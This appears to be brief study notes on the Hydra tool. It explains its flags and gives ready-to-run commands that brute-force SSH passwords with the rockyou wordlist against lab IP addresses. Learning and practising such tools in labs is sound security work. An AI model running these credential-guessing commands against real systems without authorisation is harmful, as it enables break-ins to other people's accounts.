# Parameters:

hydra -l/L <username | username list> -p/P <password | passwordlist> targetIP serviceToUse -t 16

```
-l # List the username, multiple username can be used with a comma (e.g.: john,jane)
-L # List the username file list
-p # Specify the password(s) to use, multiple can be add with comma
-P # Specify password list
-t 16 # use 16 threads
```

Password cracking if you have some usernames:
```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.50.10.53 ssh
```

Run multiple threads, user the -t option
```
hydra -l helios -P /usr/share/wordlists/rockyou.txt 10.50.10.138 ssh -t 16
```
